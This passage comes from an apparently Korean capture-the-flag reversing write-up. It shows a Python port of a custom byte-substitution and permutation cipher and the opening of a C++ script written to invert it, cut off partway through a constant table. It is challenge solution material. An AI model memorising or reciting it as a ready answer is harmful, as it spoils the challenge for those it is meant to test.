<span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">]</span>
<span class="n">g</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x91</span><span class="p">,</span><span class="mh">0xd7</span><span class="p">,</span><span class="mh">0x36</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0xb1</span><span class="p">,</span><span class="mh">0x36</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0xd7</span><span class="p">,</span><span class="mh">0xce</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0xd7</span><span class="p">,</span><span class="mh">0x36</span><span class="p">,</span><span class="mh">0xd9</span><span class="p">]</span>
<span class="n">p</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">]</span>

<span class="n">a</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">comp</span><span class="p">)[:</span><span class="mi">16</span><span class="p">]</span>
<span class="n">r</span> <span class="o">=</span> <span class="mh">0xC0FF33</span>

<span class="k">def</span> <span class="nf">rol</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">n</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">((</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">n</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>

<span class="k">def</span> <span class="nf">sub</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="n">t</span> <span class="o">=</span> <span class="p">[</span><span class="n">sbox</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">a</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">a</span>

<span class="k">def</span> <span class="nf">shift_row</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">],</span><span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">],</span><span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">12</span><span class="p">]</span><span class="o">=</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">],</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">],</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">],</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">a</span>

<span class="k">def</span> <span class="nf">enc</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">^=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">|</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">a</span><span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span> <span class="o">+=</span> <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
        <span class="n">a</span><span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">],</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">&amp;</span><span class="mi">7</span><span class="p">)</span>
        <span class="n">x</span><span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">a</span>

<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
        <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">a</span>


<span class="n">a</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="sa">b</span><span class="s">'zxcvasdfqwer1234'</span><span class="p">)</span>

<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">r</span><span class="p">)):</span>
    <span class="n">sub</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">shift_row</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">enc</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

    <span class="n">xor</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>

    <span class="n">sub</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
    <span class="n">shift_row</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
    <span class="n">enc</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">a</span><span class="p">).</span><span class="nb">hex</span><span class="p">(</span><span class="n">sep</span><span class="o">=</span><span class="s">' '</span><span class="p">))</span>
</pre></table></code></div></div><p>파이썬을 이용해서 코드를 포팅해서 처음에는 파이썬으로 역연산 하려고 했지만<br /> 연산 속도가 너무 느려서 C++로 역연산 스크립트를 작성하였다.</p><blockquote><p>Solution Script</p></blockquote><div class="language-c++ highlighter-rouge"><div class="code-header"> <span label-text="C++"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;iostream&gt;
</span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">x</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">comp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sbox</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> 